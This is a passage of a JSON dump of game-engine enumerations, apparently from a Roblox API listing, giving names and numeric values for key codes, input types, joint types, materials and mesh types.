ype"},{"type":"EnumItem","Name":"RightTread","tags":[],"Value":2,"Enum":"InputType"},{"type":"EnumItem","Name":"Steer","tags":[],"Value":3,"Enum":"InputType"},{"type":"EnumItem","Name":"Throtle","tags":[],"Value":4,"Enum":"InputType"},{"type":"EnumItem","Name":"UpDown","tags":[],"Value":6,"Enum":"InputType"},{"type":"EnumItem","Name":"Action1","tags":[],"Value":7,"Enum":"InputType"},{"type":"EnumItem","Name":"Action2","tags":[],"Value":8,"Enum":"InputType"},{"type":"EnumItem","Name":"Action3","tags":[],"Value":9,"Enum":"InputType"},{"type":"EnumItem","Name":"Action4","tags":[],"Value":10,"Enum":"InputType"},{"type":"EnumItem","Name":"Action5","tags":[],"Value":11,"Enum":"InputType"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":12,"Enum":"InputType"},{"type":"EnumItem","Name":"Sin","tags":[],"Value":13,"Enum":"InputType"},{"type":"Enum","Name":"JointCreationMode","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"Surface","tags":[],"Value":1,"Enum":"JointCreationMode"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"JointCreationMode"},{"type":"Enum","Name":"JointType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":22,"Enum":"JointType"},{"type":"EnumItem","Name":"Rotate","tags":[],"Value":6,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateP","tags":[],"Value":7,"Enum":"JointType"},{"type":"EnumItem","Name":"RotateV","tags":[],"Value":8,"Enum":"JointType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":9,"Enum":"JointType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":1,"Enum":"JointType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":3,"Enum":"JointType"},{"type":"Enum","Name":"KeyCode","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backspace","tags":[],"Value":8,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tab","tags":[],"Value":9,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Clear","tags":[],"Value":12,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Return","tags":[],"Value":13,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":19,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Escape","tags":[],"Value":27,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Space","tags":[],"Value":32,"Enum":"KeyCode"},{"type":"EnumItem","Name":"QuotedDouble","tags":[],"Value":34,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Hash","tags":[],"Value":35,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Dollar","tags":[],"Value":36,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Percent","tags":[],"Value":37,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Ampersand","tags":[],"Value":38,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Quote","tags":[],"Value":39,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftParenthesis","tags":[],"Value":40,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightParenthesis","tags":[],"Value":41,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Asterisk","tags":[],"Value":42,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Plus","tags":[],"Value":43,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Comma","tags":[],"Value":44,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Minus","tags":[],"Value":45,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Period","tags":[],"Value":46,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Slash","tags":[],"Value":47,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Zero","tags":[],"Value":48,"Enum":"KeyCode"},{"type":"EnumItem","Name":"One","tags":[],"Value":49,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Two","tags":[],"Value":50,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Three","tags":[],"Value":51,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Four","tags":[],"Value":52,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Five","tags":[],"Value":53,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Six","tags":[],"Value":54,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Seven","tags":[],"Value":55,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Eight","tags":[],"Value":56,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Nine","tags":[],"Value":57,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Colon","tags":[],"Value":58,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Semicolon","tags":[],"Value":59,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LessThan","tags":[],"Value":60,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Equals","tags":[],"Value":61,"Enum":"KeyCode"},{"type":"EnumItem","Name":"GreaterThan","tags":[],"Value":62,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Question","tags":[],"Value":63,"Enum":"KeyCode"},{"type":"EnumItem","Name":"At","tags":[],"Value":64,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftBracket","tags":[],"Value":91,"Enum":"KeyCode"},{"type":"EnumItem","Name":"BackSlash","tags":[],"Value":92,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightBracket","tags":[],"Value":93,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Caret","tags":[],"Value":94,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Underscore","tags":[],"Value":95,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Backquote","tags":[],"Value":96,"Enum":"KeyCode"},{"type":"EnumItem","Name":"A","tags":[],"Value":97,"Enum":"KeyCode"},{"type":"EnumItem","Name":"B","tags":[],"Value":98,"Enum":"KeyCode"},{"type":"EnumItem","Name":"C","tags":[],"Value":99,"Enum":"KeyCode"},{"type":"EnumItem","Name":"D","tags":[],"Value":100,"Enum":"KeyCode"},{"type":"EnumItem","Name":"E","tags":[],"Value":101,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F","tags":[],"Value":102,"Enum":"KeyCode"},{"type":"EnumItem","Name":"G","tags":[],"Value":103,"Enum":"KeyCode"},{"type":"EnumItem","Name":"H","tags":[],"Value":104,"Enum":"KeyCode"},{"type":"EnumItem","Name":"I","tags":[],"Value":105,"Enum":"KeyCode"},{"type":"EnumItem","Name":"J","tags":[],"Value":106,"Enum":"KeyCode"},{"type":"EnumItem","Name":"K","tags":[],"Value":107,"Enum":"KeyCode"},{"type":"EnumItem","Name":"L","tags":[],"Value":108,"Enum":"KeyCode"},{"type":"EnumItem","Name":"M","tags":[],"Value":109,"Enum":"KeyCode"},{"type":"EnumItem","Name":"N","tags":[],"Value":110,"Enum":"KeyCode"},{"type":"EnumItem","Name":"O","tags":[],"Value":111,"Enum":"KeyCode"},{"type":"EnumItem","Name":"P","tags":[],"Value":112,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Q","tags":[],"Value":113,"Enum":"KeyCode"},{"type":"EnumItem","Name":"R","tags":[],"Value":114,"Enum":"KeyCode"},{"type":"EnumItem","Name":"S","tags":[],"Value":115,"Enum":"KeyCode"},{"type":"EnumItem","Name":"T","tags":[],"Value":116,"Enum":"KeyCode"},{"type":"EnumItem","Name":"U","tags":[],"Value":117,"Enum":"KeyCode"},{"type":"EnumItem","Name":"V","tags":[],"Value":118,"Enum":"KeyCode"},{"type":"EnumItem","Name":"W","tags":[],"Value":119,"Enum":"KeyCode"},{"type":"EnumItem","Name":"X","tags":[],"Value":120,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Y","tags":[],"Value":121,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Z","tags":[],"Value":122,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftCurly","tags":[],"Value":123,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Pipe","tags":[],"Value":124,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightCurly","tags":[],"Value":125,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Tilde","tags":[],"Value":126,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Delete","tags":[],"Value":127,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadZero","tags":[],"Value":256,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadOne","tags":[],"Value":257,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadTwo","tags":[],"Value":258,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadThree","tags":[],"Value":259,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFour","tags":[],"Value":260,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadFive","tags":[],"Value":261,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSix","tags":[],"Value":262,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadSeven","tags":[],"Value":263,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEight","tags":[],"Value":264,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadNine","tags":[],"Value":265,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPeriod","tags":[],"Value":266,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadDivide","tags":[],"Value":267,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMultiply","tags":[],"Value":268,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadMinus","tags":[],"Value":269,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadPlus","tags":[],"Value":270,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEnter","tags":[],"Value":271,"Enum":"KeyCode"},{"type":"EnumItem","Name":"KeypadEquals","tags":[],"Value":272,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Up","tags":[],"Value":273,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Down","tags":[],"Value":274,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Right","tags":[],"Value":275,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Left","tags":[],"Value":276,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Insert","tags":[],"Value":277,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Home","tags":[],"Value":278,"Enum":"KeyCode"},{"type":"EnumItem","Name":"End","tags":[],"Value":279,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":280,"Enum":"KeyCode"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":281,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftShift","tags":[],"Value":304,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightShift","tags":[],"Value":303,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftMeta","tags":[],"Value":310,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightMeta","tags":[],"Value":309,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftAlt","tags":[],"Value":308,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightAlt","tags":[],"Value":307,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftControl","tags":[],"Value":306,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightControl","tags":[],"Value":305,"Enum":"KeyCode"},{"type":"EnumItem","Name":"CapsLock","tags":[],"Value":301,"Enum":"KeyCode"},{"type":"EnumItem","Name":"NumLock","tags":[],"Value":300,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ScrollLock","tags":[],"Value":302,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftSuper","tags":[],"Value":311,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightSuper","tags":[],"Value":312,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Mode","tags":[],"Value":313,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Compose","tags":[],"Value":314,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Help","tags":[],"Value":315,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Print","tags":[],"Value":316,"Enum":"KeyCode"},{"type":"EnumItem","Name":"SysReq","tags":[],"Value":317,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Break","tags":[],"Value":318,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Menu","tags":[],"Value":319,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Power","tags":[],"Value":320,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Euro","tags":[],"Value":321,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Undo","tags":[],"Value":322,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F1","tags":[],"Value":282,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F2","tags":[],"Value":283,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F3","tags":[],"Value":284,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F4","tags":[],"Value":285,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F5","tags":[],"Value":286,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F6","tags":[],"Value":287,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F7","tags":[],"Value":288,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F8","tags":[],"Value":289,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F9","tags":[],"Value":290,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F10","tags":[],"Value":291,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F11","tags":[],"Value":292,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F12","tags":[],"Value":293,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F13","tags":[],"Value":294,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F14","tags":[],"Value":295,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F15","tags":[],"Value":296,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World0","tags":[],"Value":160,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World1","tags":[],"Value":161,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World2","tags":[],"Value":162,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World3","tags":[],"Value":163,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World4","tags":[],"Value":164,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World5","tags":[],"Value":165,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World6","tags":[],"Value":166,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World7","tags":[],"Value":167,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World8","tags":[],"Value":168,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World9","tags":[],"Value":169,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World10","tags":[],"Value":170,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World11","tags":[],"Value":171,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World12","tags":[],"Value":172,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World13","tags":[],"Value":173,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World14","tags":[],"Value":174,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World15","tags":[],"Value":175,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World16","tags":[],"Value":176,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World17","tags":[],"Value":177,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World18","tags":[],"Value":178,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World19","tags":[],"Value":179,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World20","tags":[],"Value":180,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World21","tags":[],"Value":181,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World22","tags":[],"Value":182,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World23","tags":[],"Value":183,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World24","tags":[],"Value":184,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World25","tags":[],"Value":185,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World26","tags":[],"Value":186,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World27","tags":[],"Value":187,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World28","tags":[],"Value":188,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World29","tags":[],"Value":189,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World30","tags":[],"Value":190,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World31","tags":[],"Value":191,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World32","tags":[],"Value":192,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World33","tags":[],"Value":193,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World34","tags":[],"Value":194,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World35","tags":[],"Value":195,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World36","tags":[],"Value":196,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World37","tags":[],"Value":197,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World38","tags":[],"Value":198,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World39","tags":[],"Value":199,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World40","tags":[],"Value":200,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World41","tags":[],"Value":201,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World42","tags":[],"Value":202,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World43","tags":[],"Value":203,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World44","tags":[],"Value":204,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World45","tags":[],"Value":205,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World46","tags":[],"Value":206,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World47","tags":[],"Value":207,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World48","tags":[],"Value":208,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World49","tags":[],"Value":209,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World50","tags":[],"Value":210,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World51","tags":[],"Value":211,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World52","tags":[],"Value":212,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World53","tags":[],"Value":213,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World54","tags":[],"Value":214,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World55","tags":[],"Value":215,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World56","tags":[],"Value":216,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World57","tags":[],"Value":217,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World58","tags":[],"Value":218,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World59","tags":[],"Value":219,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World60","tags":[],"Value":220,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World61","tags":[],"Value":221,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World62","tags":[],"Value":222,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World63","tags":[],"Value":223,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World64","tags":[],"Value":224,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World65","tags":[],"Value":225,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World66","tags":[],"Value":226,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World67","tags":[],"Value":227,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World68","tags":[],"Value":228,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World69","tags":[],"Value":229,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World70","tags":[],"Value":230,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World71","tags":[],"Value":231,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World72","tags":[],"Value":232,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World73","tags":[],"Value":233,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World74","tags":[],"Value":234,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World75","tags":[],"Value":235,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World76","tags":[],"Value":236,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World77","tags":[],"Value":237,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World78","tags":[],"Value":238,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World79","tags":[],"Value":239,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World80","tags":[],"Value":240,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World81","tags":[],"Value":241,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World82","tags":[],"Value":242,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World83","tags":[],"Value":243,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World84","tags":[],"Value":244,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World85","tags":[],"Value":245,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World86","tags":[],"Value":246,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World87","tags":[],"Value":247,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World88","tags":[],"Value":248,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World89","tags":[],"Value":249,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World90","tags":[],"Value":250,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World91","tags":[],"Value":251,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World92","tags":[],"Value":252,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World93","tags":[],"Value":253,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World94","tags":[],"Value":254,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World95","tags":[],"Value":255,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonX","tags":[],"Value":1000,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonY","tags":[],"Value":1001,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonA","tags":[],"Value":1002,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonB","tags":[],"Value":1003,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR1","tags":[],"Value":1004,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL1","tags":[],"Value":1005,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR2","tags":[],"Value":1006,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL2","tags":[],"Value":1007,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR3","tags":[],"Value":1008,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL3","tags":[],"Value":1009,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonStart","tags":[],"Value":1010,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonSelect","tags":[],"Value":1011,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadLeft","tags":[],"Value":1012,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadRight","tags":[],"Value":1013,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadUp","tags":[],"Value":1014,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadDown","tags":[],"Value":1015,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick1","tags":[],"Value":1016,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick2","tags":[],"Value":1017,"Enum":"KeyCode"},{"type":"Enum","Name":"KeywordFilterType","tags":[]},{"type":"EnumItem","Name":"Include","tags":[],"Value":0,"Enum":"KeywordFilterType"},{"type":"EnumItem","Name":"Exclude","tags":[],"Value":1,"Enum":"KeywordFilterType"},{"type":"Enum","Name":"LeftRight","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Right","tags":[],"Value":2,"Enum":"LeftRight"},{"type":"Enum","Name":"LevelOfDetailSetting","tags":[]},{"type":"EnumItem","Name":"High","tags":[],"Value":2,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":1,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Low","tags":[],"Value":0,"Enum":"LevelOfDetailSetting"},{"type":"Enum","Name":"ListenerType","tags":[]},{"type":"EnumItem","Name":"Camera","tags":[],"Value":0,"Enum":"ListenerType"},{"type":"EnumItem","Name":"CFrame","tags":[],"Value":1,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectPosition","tags":[],"Value":2,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectCFrame","tags":[],"Value":3,"Enum":"ListenerType"},{"type":"Enum","Name":"Material","tags":[]},{"type":"EnumItem","Name":"Plastic","tags":[],"Value":256,"Enum":"Material"},{"type":"EnumItem","Name":"Wood","tags":[],"Value":512,"Enum":"Material"},{"type":"EnumItem","Name":"Slate","tags":[],"Value":800,"Enum":"Material"},{"type":"EnumItem","Name":"Concrete","tags":[],"Value":816,"Enum":"Material"},{"type":"EnumItem","Name":"CorrodedMetal","tags":[],"Value":1040,"Enum":"Material"},{"type":"EnumItem","Name":"DiamondPlate","tags":[],"Value":1056,"Enum":"Material"},{"type":"EnumItem","Name":"Foil","tags":[],"Value":1072,"Enum":"Material"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1280,"Enum":"Material"},{"type":"EnumItem","Name":"Ice","tags":[],"Value":1536,"Enum":"Material"},{"type":"EnumItem","Name":"Marble","tags":[],"Value":784,"Enum":"Material"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":832,"Enum":"Material"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":848,"Enum":"Material"},{"type":"EnumItem","Name":"Pebble","tags":[],"Value":864,"Enum":"Material"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":1296,"Enum":"Material"},{"type":"EnumItem","Name":"Fabric","tags":[],"Value":1312,"Enum":"Material"},{"type":"EnumItem","Name":"SmoothPlastic","tags":[],"Value":272,"Enum":"Material"},{"type":"EnumItem","Name":"Metal","tags":[],"Value":1088,"Enum":"Material"},{"type":"EnumItem","Name":"WoodPlanks","tags":[],"Value":528,"Enum":"Material"},{"type":"EnumItem","Name":"Cobblestone","tags":[],"Value":880,"Enum":"Material"},{"type":"EnumItem","Name":"Air","tags":["notbrowsable"],"Value":1792,"Enum":"Material"},{"type":"EnumItem","Name":"Water","tags":["notbrowsable"],"Value":2048,"Enum":"Material"},{"type":"EnumItem","Name":"Rock","tags":["notbrowsable"],"Value":896,"Enum":"Material"},{"type":"EnumItem","Name":"Glacier","tags":["notbrowsable"],"Value":1552,"Enum":"Material"},{"type":"EnumItem","Name":"Snow","tags":["notbrowsable"],"Value":1328,"Enum":"Material"},{"type":"EnumItem","Name":"Sandstone","tags":["notbrowsable"],"Value":912,"Enum":"Material"},{"type":"EnumItem","Name":"Mud","tags":["notbrowsable"],"Value":1344,"Enum":"Material"},{"type":"EnumItem","Name":"Basalt","tags":["notbrowsable"],"Value":788,"Enum":"Material"},{"type":"EnumItem","Name":"Ground","tags":["notbrowsable"],"Value":1360,"Enum":"Material"},{"type":"EnumItem","Name":"CrackedLava","tags":["notbrowsable"],"Value":804,"Enum":"Material"},{"type":"EnumItem","Name":"Neon","tags":[],"Value":288,"Enum":"Material"},{"type":"EnumItem","Name":"Asphalt","tags":["notbrowsable"],"Value":1376,"Enum":"Material"},{"type":"EnumItem","Name":"LeafyGrass","tags":["notbrowsable"],"Value":1284,"Enum":"Material"},{"type":"EnumItem","Name":"Salt","tags":["notbrowsable"],"Value":1392,"Enum":"Material"},{"type":"EnumItem","Name":"Limestone","tags":["notbrowsable"],"Value":820,"Enum":"Material"},{"type":"EnumItem","Name":"Pavement","tags":["notbrowsable"],"Value":836,"Enum":"Material"},{"type":"Enum","Name":"MembershipType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"MembershipType"},{"type":"EnumItem","Name":"BuildersClub","tags":[],"Value":1,"Enum":"MembershipType"},{"type":"EnumItem","Name":"TurboBuildersClub","tags":[],"Value":2,"Enum":"MembershipType"},{"type":"EnumItem","Name":"OutrageousBuildersClub","tags":[],"Value":3,"Enum":"MembershipType"},{"type":"Enum","Name":"MeshType","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"MeshType"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"MeshType"},{"type":"EnumItem","Name":"Wedge","tags":[],"Value":2,"Enum":"MeshType"},{"type":"EnumItem","Name":"Prism","tags":["deprecated"],"Value":7,"Enum":"MeshType"},{"type":"EnumItem","Name":"Pyramid","tags":["deprecated"],"Value":8,"Enum":"MeshType"},{"type":"EnumItem","Name":"ParallelRamp","tags":["deprecated"],"Value":9,"Enum":"MeshType"},{"type":"EnumItem","Name":"RightAngleRamp","tags":["deprecated"],"Value":10,"Enum":"MeshType"},{"type":"EnumItem","Name":"CornerWedge","tags":["deprecated"],"Value":11,"Enum":"MeshType"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":6,"Enum":"MeshType"},{"type":"EnumItem","Name":"Sphere","tags":[],"Value":3,"Enum":"MeshType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":4,"Enum":"MeshType"},{"type":"EnumItem","Name":"FileMesh","tags":[],"Value":5,"Enum":"MeshType"},{"type":"Enum","Name":"MessageType","tags":[]},{"type":"EnumItem","Name":"MessageOutput","tags":[],"Value":0,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageInf